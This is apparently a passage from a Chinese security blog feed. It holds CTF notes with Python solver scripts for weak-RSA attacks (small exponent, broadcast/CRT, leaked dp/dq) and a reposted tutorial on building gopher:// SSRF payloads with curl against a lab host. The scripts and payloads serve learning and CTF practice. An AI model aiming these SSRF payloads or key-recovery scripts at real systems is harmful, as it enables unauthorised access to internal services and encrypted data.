<p>[使用rsatool生成私钥文件: private.pem]</p>
</blockquote>
<blockquote>
<p>openssl rsautl -decrypt -in flag.enc -inkey private.pem</p>
</blockquote>
<hr>
<h2 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a><strong>低加密指数攻击</strong></h2><p>在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p>
<p><strong>e=3时的小明文攻击</strong></p>
<p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>
<blockquote>
<p>(1)m^3&lt;n,也就是说m^3=c;<br>(2)m^3&gt;n，即(m^3+kn)mod n=c（爆破k，不知道k取什么值）。</p>
</blockquote>
<ul>
<li>第一种情况   根据 <code>c = pow(m, e, N) </code>可知：</li>
</ul>
<p>当e=3时，如果明文过小，导致<strong>明文的三次方</strong>仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>
<ul>
<li>第二种情况  如果<strong>明文的三次方</strong>比n大，但是不够大，那么设k，有：    c=(m^3+kn)mod n</li>
</ul>
<p>爆破k，如果（c-kn）能开三次根式，那么可以直接得到明文。</p>
<p><strong>识别：</strong></p>
<p>推荐在e=3的时候首先尝试这种方法。</p>
<blockquote>
<p> openssl  rsa  -pubin  -in  pubkey.pem  （读取公钥内容）<br> openssl  rsa   -pubin  in  pubkey.pem -text（以文本格式输出公钥内容),从这一步可以知道e的值</p>
</blockquote>
<p>从而判断为低加密指数攻击</p>
<hr>
<h2 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a><strong>低加密指数广播攻击</strong></h2><p>低加密指数广播攻击，即如果选取的加密指数较低，并且使用了相同的加密指数给一个接收者发送了相同的信息（或者给一群接收者发送了相同的信息），那么可以进行广播攻击得到明文。</p>
<p>假如我们需要将一份明文进行多份加密，但是每份使用不同的密钥，密钥中的模数n不同但指数e相同且很小，我们只要拿到多份密文和对应的n就可以利用<a href="https://www.cnblogs.com/freinds/p/6388992.html">中国剩余定理</a>进行解密。</p>
<p> <strong>适用</strong></p>
<p>只要满足以下情况，我们就可以考虑实用低加密指数广播攻击：</p>
<blockquote>
<p>1.加密指数e非常小<br>2.一份明文使用不同的模数n，相同的加密指数e进行多次加密<br>3.可以拿到每一份加密后的密文和对应的模数n、加密指数e</p>
</blockquote>
<p>低加密指数广播攻击脚本</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"># codin<span class="variable">g:utf8</span></span><br><span class="line"></span><br><span class="line">from struct import pack,unpack</span><br><span class="line">import zlib</span><br><span class="line">import gmpy</span><br><span class="line">def my_parse_number(<span class="keyword">number</span>):</span><br><span class="line">    <span class="built_in">string</span> = <span class="string">&quot;%x&quot;</span> % <span class="keyword">number</span></span><br><span class="line">    #if <span class="built_in">len</span>(<span class="built_in">string</span>) != <span class="number">64</span>:</span><br><span class="line">    #    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    erg = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">string</span> != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        erg = erg + [chr(<span class="keyword">int</span>(<span class="built_in">string</span>[:<span class="number">2</span>], <span class="number">16</span>))]</span><br><span class="line">        <span class="built_in">string</span> = <span class="built_in">string</span>[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.<span class="keyword">join</span>(erg)</span><br><span class="line">def extended_gcd(<span class="keyword">a</span>, <span class="keyword">b</span>):</span><br><span class="line">    <span class="keyword">x</span>,<span class="keyword">y</span> = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    lastx, lasty = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="variable">b:</span></span><br><span class="line">        <span class="keyword">a</span>, (q, <span class="keyword">b</span>) = <span class="keyword">b</span>, divmod(<span class="keyword">a</span>,<span class="keyword">b</span>)</span><br><span class="line">        <span class="keyword">x</span>, lastx = lastx-q*<span class="keyword">x</span>, <span class="keyword">x</span></span><br><span class="line">        <span class="keyword">y</span>, lasty = lasty-q*<span class="keyword">y</span>, <span class="keyword">y</span></span><br><span class="line">    <span class="keyword">return</span> (lastx, lasty, <span class="keyword">a</span>)</span><br><span class="line">def chinese_remainder_theorem(<span class="built_in">items</span>):</span><br><span class="line">  <span class="keyword">N</span> = <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> <span class="keyword">a</span>, n in item<span class="variable">s:</span></span><br><span class="line">    <span class="keyword">N</span> *= n</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> <span class="keyword">a</span>, n in item<span class="variable">s:</span></span><br><span class="line">    <span class="keyword">m</span> = <span class="keyword">N</span>/n</span><br><span class="line">    r, s, d = extended_gcd(n, <span class="keyword">m</span>)</span><br><span class="line">    <span class="keyword">if</span> d != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">N</span>=<span class="keyword">N</span>/n</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">      #raise <span class="string">&quot;Input not pairwise co-prime&quot;</span></span><br><span class="line">    result += <span class="keyword">a</span>*s*<span class="keyword">m</span></span><br><span class="line">  <span class="keyword">return</span> result % <span class="keyword">N</span>, <span class="keyword">N</span></span><br><span class="line">  //中国剩余定理 ， 输入多组<span class="keyword">c</span>和多组n，以及较小的指数<span class="keyword">e</span></span><br><span class="line">sessions=[</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: , <span class="string">&quot;e&quot;</span>: , <span class="string">&quot;n&quot;</span>: &#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: , <span class="string">&quot;e&quot;</span>: , <span class="string">&quot;n&quot;</span>: &#125;,</span><br><span class="line">&#123;<span class="string">&quot;c&quot;</span>: , <span class="string">&quot;e&quot;</span>: , <span class="string">&quot;n&quot;</span>: &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> session in session<span class="variable">s:</span></span><br><span class="line">    <span class="keyword">e</span>=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">    n=session[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">    msg=session[<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">    data = data + [(msg, n)]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Please wait, performing CRT&quot;</span></span><br><span class="line"><span class="keyword">x</span>, n = chinese_remainder_theorem(data)</span><br><span class="line"><span class="keyword">e</span>=session[<span class="string">&#x27;e&#x27;</span>]</span><br><span class="line">realnum = gmpy.mpz(<span class="keyword">x</span>).root(<span class="keyword">e</span>)[<span class="number">0</span>].digits()</span><br><span class="line"><span class="keyword">print</span> my_parse_number(<span class="keyword">int</span>(realnum))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="n可以分解为多个素数"><a href="#n可以分解为多个素数" class="headerlink" title="n可以分解为多个素数"></a><strong>n可以分解为多个素数</strong></h2><p>使用公钥加密和使用私钥解密流程（中国剩余定理）：<br>准备<br>首先，我们需要在在生成私钥公钥时，多生成几个数：<br>我们的d是e对phi(n)的逆元，我们现在需要另外2个逆元（分别是对(p-1)和(q-1)的），既<br>1：计算dp，使得dp * e = 1 mod(p-1)<br>2：计算dq，使得dq * e = 1 mod(q-1)<br>此外需要第三个元素，既q对p的逆元<br>3：计算qInv，使得qInv * q = 1 mod p<br>        1 2 3 都作为私钥的一部分。</p>
<blockquote>
<p>dp = d mod p-1<br>dq = d mod q-1</p>
</blockquote>
<p><strong>计算：</strong></p>
<p>使用公钥加密：<br>若要加密明文m,则需要计算c = m^e mod n，c为密文。</p>
<p>使用私钥解密：<br>1:m1=c^dp mod p<br>2:m2=c^dq mod q<br>3:h= (qInv*((m1 - m2)mod p)) mod p<br>4:m = m2 + h*q<br>m就是明文。</p>
<p>例：n=17947<br>           e=3<br>           c=8363<br>           m=???</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"><span class="attribute">n</span>=17947</span><br><span class="line"><span class="attribute">p</span>=137</span><br><span class="line"><span class="attribute">q</span>=131</span><br><span class="line"><span class="attribute">e</span>=3</span><br><span class="line"><span class="attribute">c</span>=8363</span><br><span class="line"><span class="attribute">dp</span>=gmpy2.invert(e,p-1)</span><br><span class="line"><span class="attribute">dq</span>=gmpy2.invert(e,q-1)</span><br><span class="line"><span class="attribute">m1</span>=pow(c,dp,p)</span><br><span class="line"><span class="attribute">m2</span>=pow(c,dq,q)</span><br><span class="line"><span class="attribute">qInv</span>=gmpy2.invert(q,p)</span><br><span class="line">h=(qInv*((m1-m2)% p)) % p</span><br><span class="line"><span class="attribute">m</span>=m2+h*q</span><br><span class="line"><span class="builtin-name">print</span>(m)</span><br></pre></td></tr></table></figure>
<p><strong>多素数</strong></p>
<p>例:n=p1<em>p2</em>p3=2279269<br>     p1=137<br>     p2=131<br>     p3=127<br>     e=19</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line">预先计算:</span><br><span class="line"><span class="attr">dp</span> = <span class="number">19</span>^-<span class="number">1</span> mod <span class="number">137</span><span class="attr">-1</span> = <span class="number">43</span></span><br><span class="line"><span class="attr">dq</span> = <span class="number">19</span>^-<span class="number">1</span> mod <span class="number">131</span><span class="attr">-1</span> = <span class="number">89</span></span><br><span class="line"><span class="attr">dr</span> = <span class="number">19</span>^-<span class="number">1</span> mod <span class="number">127</span><span class="attr">-1</span> = <span class="number">73</span></span><br><span class="line"></span><br><span class="line">若要解密密文 <span class="number">768924</span>，则先计算</span><br><span class="line"><span class="number">1</span>:<span class="attr">m1=768924^43</span> mod <span class="number">137</span> = <span class="number">102</span></span><br><span class="line"><span class="number">2</span>:<span class="attr">m2=768924^89</span> mod <span class="number">131</span> = <span class="number">120</span></span><br><span class="line"><span class="number">3</span>:<span class="attr">m3=768924^73</span> mod <span class="number">127</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">等式<span class="number">1</span>与等式<span class="number">2</span>连列方程组计算：</span><br><span class="line"><span class="attr">qInv</span> = <span class="number">114</span></span><br><span class="line"><span class="attr">h</span> = (qInv*((m1 - m2)mod p)) mod <span class="attr">p</span> = <span class="number">3</span></span><br><span class="line"><span class="attr">m12</span> = m2 + h*<span class="attr">q</span> = <span class="number">120</span> + <span class="number">3</span>*<span class="number">131</span> = <span class="number">513</span></span><br><span class="line"></span><br><span class="line">所以等式<span class="number">1</span>与等式<span class="number">2</span>的通用解为：<span class="number">513</span>+k1*(<span class="number">131</span>*<span class="number">137</span>)</span><br><span class="line">所以结合等式<span class="number">3</span>问题可以变为：</span><br><span class="line"><span class="attr">m1=513</span>  <span class="attr">p=17947</span></span><br><span class="line"><span class="attr">m2=5</span>    <span class="attr">q=127</span></span><br><span class="line">qInv*q≡ <span class="number">1</span> mod p    ——&gt;<span class="attr">qInv=10316</span></span><br><span class="line"><span class="attr">h</span> = (<span class="number">10316</span>*((<span class="number">513</span> - <span class="number">5</span>)mod <span class="number">17947</span>)) mod <span class="number">17947</span> =<span class="number">4</span></span><br><span class="line"><span class="attr">m</span> = <span class="number">5</span> + <span class="number">4</span>*<span class="number">127</span> = <span class="number">513</span></span><br><span class="line">......</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>jiaoben</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">n</span>=<span class="number">2279269</span></span><br><span class="line"><span class="attribute">p1</span>=<span class="number">137</span></span><br><span class="line"><span class="attribute">p2</span>=<span class="number">131</span></span><br><span class="line"><span class="attribute">p3</span>=<span class="number">127</span></span><br><span class="line"><span class="attribute">e</span>=<span class="number">19</span></span><br><span class="line"><span class="attribute">c</span>=<span class="number">768924</span></span><br><span class="line"><span class="attribute">dp1</span>=gmpy<span class="number">2</span>.invert(e,p<span class="number">1</span>-<span class="number">1</span>)</span><br><span class="line"><span class="attribute">dp2</span>=gmpy<span class="number">2</span>.invert(e,p<span class="number">2</span>-<span class="number">1</span>)</span><br><span class="line"><span class="attribute">dp3</span>=gmpy<span class="number">2</span>.invert(e,p<span class="number">3</span>-<span class="number">1</span>)</span><br><span class="line"><span class="attribute">m1</span>=pow(c,dp<span class="number">1</span>,p<span class="number">1</span>)</span><br><span class="line"><span class="attribute">m2</span>=pow(c,dp<span class="number">2</span>,p<span class="number">2</span>)</span><br><span class="line"><span class="attribute">m3</span>=pow(c,dp<span class="number">3</span>,p<span class="number">3</span>)</span><br><span class="line"><span class="attribute">qInv1</span>=gmpy<span class="number">2</span>.invert(p<span class="number">2</span>,p<span class="number">1</span>)</span><br><span class="line"><span class="attribute">h1</span>=(qInv<span class="number">1</span>*((m<span class="number">1</span>-m<span class="number">2</span>) % p<span class="number">1</span>)) % p<span class="number">1</span></span><br><span class="line"><span class="attribute">m4</span>=m<span class="number">2</span>+h<span class="number">1</span>*p<span class="number">2</span></span><br><span class="line"><span class="attribute">p4</span>=p<span class="number">1</span>*p<span class="number">2</span></span><br><span class="line"><span class="attribute">qInv2</span>=gmpy<span class="number">2</span>.invert(p<span class="number">3</span>,p<span class="number">4</span>)</span><br><span class="line"><span class="attribute">h2</span>=(qInv<span class="number">2</span>*((m<span class="number">4</span>-m<span class="number">3</span>)% p<span class="number">4</span>)) % p<span class="number">4</span></span><br><span class="line"><span class="attribute">m</span>=m<span class="number">3</span>+h<span class="number">2</span>*p<span class="number">3</span></span><br><span class="line"><span class="attribute">print</span>(m)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="dp、dq泄露"><a href="#dp、dq泄露" class="headerlink" title="dp、dq泄露"></a><strong>dp、dq泄露</strong></h2><blockquote>
<p>dp = d mod p-1<br>dq = d mod q-1</p>
</blockquote>
<p>这种参数是为了让解密的时候更快速而产生的</p>
<p>已知p,q,dp,dq,c求m</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import</span> gmpy2</span><br><span class="line"><span class="built_in">import</span> binascii</span><br><span class="line"><span class="built_in">import</span> libnum</span><br><span class="line">def decrypt(dp,dq,p,q,c):</span><br><span class="line">    <span class="attr">InvQ</span> = gmpy2.invert(q,p)</span><br><span class="line">    <span class="attr">mp</span> = pow(c,dp,p)</span><br><span class="line">    <span class="attr">mq</span> = pow(c,dq,q)                   <span class="comment">#求幂取模运算</span></span><br><span class="line">    <span class="attr">m=(((mp-mq)*InvQ)%p)*q+mq</span>          <span class="comment">#求明文公式</span></span><br><span class="line">    print (binascii.unhexlify(hex(m)[<span class="number">2</span>:]))</span><br><span class="line">    print(libnum.n2s(m))</span><br><span class="line"><span class="attr">p</span> = </span><br><span class="line"><span class="attr">q</span> = </span><br><span class="line"><span class="attr">dp</span> = </span><br><span class="line"><span class="attr">dq</span> = </span><br><span class="line"><span class="attr">c</span> = </span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>已知e,n,dp,c求m</strong></p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import</span> gmpy2</span><br><span class="line"><span class="built_in">import</span> libnum</span><br><span class="line"><span class="built_in">import</span> binascii</span><br><span class="line">def getd(n,e,dp):</span><br><span class="line">    for i <span class="keyword">in</span> range(<span class="number">1</span>,e):            <span class="comment">#在范围(1,e)之间进行遍历</span></span><br><span class="line">        <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%<span class="attr">i</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> n%(((dp*e-<span class="number">1</span>)/i)+<span class="number">1</span>)==<span class="number">0</span>:    <span class="comment">#存在p，使得n能被p整除</span></span><br><span class="line">                <span class="attr">p=((dp*e-1)/i)+1</span></span><br><span class="line">                <span class="attr">q=n/(((dp*e-1)/i)+1)</span></span><br><span class="line">                <span class="attr">phi</span> = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)         <span class="comment">#欧拉定理</span></span><br><span class="line">                <span class="attr">d</span> = gmpy2.invert(e,phi)%phi        <span class="comment">#求模逆</span></span><br><span class="line">                return d</span><br><span class="line"><span class="attr">e</span> =</span><br><span class="line"><span class="attr">n</span> = </span><br><span class="line"><span class="attr">dp</span> = </span><br><span class="line"><span class="attr">c</span> = </span><br><span class="line"><span class="attr">d=getd(n,e,dp)</span></span><br><span class="line"><span class="attr">m=pow(c,d,n)</span>                            <span class="comment">#快速求幂取模运算</span></span><br><span class="line">print(binascii.unhexlify(hex(m)[<span class="number">2</span>:]))       <span class="comment">#16进制转文本</span></span><br><span class="line">print(libnum.n2s(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/qq_42939527/article/details/105202716">https://blog.csdn.net/qq_42939527/article/details/105202716</a></p>
<hr>
<h2 id="已知n-r求p-q"><a href="#已知n-r求p-q" class="headerlink" title="已知n,r求p,q"></a><strong>已知n,r求p,q</strong></h2><p>核心是通过n和r解出p和q</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>二分法，求得p，q</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>RSATool<span class="number">2</span>v<span class="number">17</span>中，输入p，q，r，e，得到d  <span class="comment">(脚本也可)</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>通过m=pow<span class="comment">(c,d,n)</span></span><br><span class="line">注意：有时题目有要求，解出的可能是m乘上某一个参数，这是需要仔细审题</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>转字符，得到flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>脚本</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import</span> gmpy2</span><br><span class="line"><span class="built_in">import</span> numpy as np</span><br><span class="line">np.set_printoptions(<span class="attr">suppress=True)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">n=gmpy2.mpz(14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199...)</span></span><br><span class="line"><span class="attr">r=gmpy2.mpz(14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199...)</span></span><br><span class="line"></span><br><span class="line"><span class="attr">c1=n-r+1</span></span><br><span class="line">print (c1)</span><br><span class="line"></span><br><span class="line"><span class="attr">l=c1/2</span></span><br><span class="line"><span class="attr">r=c1</span></span><br><span class="line"><span class="comment">#p=(l+r)/2</span></span><br><span class="line"><span class="comment">#y=p*(c1-p)</span></span><br><span class="line"></span><br><span class="line">while l&lt;r:</span><br><span class="line">	<span class="attr">p=(l+r)/2</span></span><br><span class="line">	<span class="attr">y=p*(c1-p)</span></span><br><span class="line">	<span class="keyword">if</span> <span class="attr">y==n:</span></span><br><span class="line">		print (p)</span><br><span class="line">		break</span><br><span class="line">	<span class="keyword">if</span> y&gt;n:</span><br><span class="line">		print (y&gt;n)</span><br><span class="line">		<span class="attr">l=p</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print (y&lt;n)</span><br><span class="line">		<span class="attr">r=p</span></span><br><span class="line">		print (<span class="string">&quot;done&quot;</span>)</span><br><span class="line"><span class="attr">q=c1-p</span></span><br><span class="line">print q</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if p&gt;q:</span></span><br><span class="line"><span class="comment">    p,q=q,p</span></span><br><span class="line"><span class="comment">factor2 = 2021 * p + 2020 * q</span></span><br><span class="line"><span class="comment">if factor2 &lt; 0:</span></span><br><span class="line"><span class="comment">    factor2 = (-1) * factor2</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">_P=sympy.nextprime(factor2)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
  </entry>
  <entry>
    <title> Raven: 2 MYSQL udf提权</title>
    <url>/2021/08/19/Raven-2-MYSQL-udf%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="b42c9f9bbe7ebeaeeffda1cd2e8a2b0ef9533db92ebdad9b54b58da29e7c6ba0"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>SSRF基础：Gopher协议</title>
    <url>/2020/10/21/SSRF%E5%9F%BA%E7%A1%80%EF%BC%9AGopher%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>本文转载自： <a href="https://blog.csdn.net/weixin_45887311/article/details/107327706">https://blog.csdn.net/weixin_45887311/article/details/107327706</a> <a id="more"></a></p>
<p>为了调试方便，我在win10下安装curl的工具</p>
<p>下载地址：<a href="https://curl.haxx.se/download.html">https://curl.haxx.se/download.html</a></p>
<p><img src="https://img-blog.csdnimg.cn/20200713225043928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>但目前提供的版本已经不支持gopher协议了，所以我千辛万苦找到了7.60的win64版本，支持发送gopher,dict协议</p>
<p><img src="https://img-blog.csdnimg.cn/20200713225043921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>7.60地址：<a href="https://wws.lanzous.com/iaV55ekyfjc">https://wws.lanzous.com/iaV55ekyfjc</a> 点击即可下载</p>
<p>解压<img src="https://img-blog.csdnimg.cn/20200713225248465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img">后把bin目录加入windows环境变量</p>
<h2 id="一、什么是gopher协议？"><a href="#一、什么是gopher协议？" class="headerlink" title="一、什么是gopher协议？"></a>一、什么是gopher协议？</h2><p><strong>定义</strong>：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
<blockquote>
<p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p>
</blockquote>
<p><strong>限制</strong>：gopher协议在各个编程语言中的使用限制</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9waWMxLnpoaW1nLmNvbS92Mi1lYTliYjk1MzgwNDQ5MzNhYzNjOTE4ZDVhNTZmMmQ2OV9yLmpwZw?x-oss-process=image/format,png" alt="img"></p>
<blockquote>
<p>–wite-curlwrappers：运用curl工具打开url流<br>curl使用curl –version查看版本以及支持的协议</p>
</blockquote>
<p><strong>Gopher协议格式</strong>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">URL:gopher://<span class="tag">&lt;<span class="name">host</span>&gt;</span>:<span class="tag">&lt;<span class="name">port</span>&gt;</span>/<span class="tag">&lt;<span class="name">gopher-path</span>&gt;</span>_后接TCP数据流</span><br></pre></td></tr></table></figure>
<ul>
<li>gopher的默认端口是70</li>
<li>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</li>
</ul>
<p>二、测试网页：</p>
<p>1、get请求的发送，一个简单的php网页：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello  &quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200713225815389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>用burpsuite抓包复制整体的http请求 </p>
<p><img src="https://img-blog.csdnimg.cn/20200713225922653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>可以删除些信息，然后来用curl来测试一下，首先需要对http请求转码，添加%0d%0a</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ssrf/get.php?name=yanshu</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.111</span><br><span class="line"></span><br><span class="line">gopher请求: （gopher的请求体前一定不能漏了_）</span><br><span class="line">curl gopher://192.168.0.111:80/_GET%20/ssrf/get.php%3Fname%3Dyanshu%20HTTP/1.1%0D%0AHost%3A%20192.168.0.111%0D%0A</span><br></pre></td></tr></table></figure>
<p>附上PY脚本，可以直接使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;GET /ssrf/get.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.0.111</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line"><span class="comment">#注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
<p> 请求成功：<img src="https://img-blog.csdnimg.cn/20200713230550194.png" alt="img"></p>
<p> 2、post请求</p>
<p>测试页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello  &quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>但是如果只是简单地把GET包改成POST包发送，会出现大问题：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssrf/post.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.111</span><br><span class="line"></span><br><span class="line">name = yanshu</span><br><span class="line"></span><br><span class="line">gopher请求：</span><br><span class="line">curl gopher://192.168.0.111:80/_POST%20/ssrf/post.php%20HTTP/1.1%0D%0AHost%3A%20192.168.0.111%0D%0A%0D%0Aname%20%3D%20yanshu%0D%0A</span><br></pre></td></tr></table></figure>
<p> 浏览器会无法识别你的请求;</p>
<p><img src="https://img-blog.csdnimg.cn/20200713230912541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p> 所以想发送一个完整的POST数据包，这四个字段是不可缺少的</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/ssrf/post.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.111</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line">name=yanshu</span><br></pre></td></tr></table></figure>
<p> 注意一点：使用脚本转的时候，每次不同的content-length都是不一样的，需要修改</p>
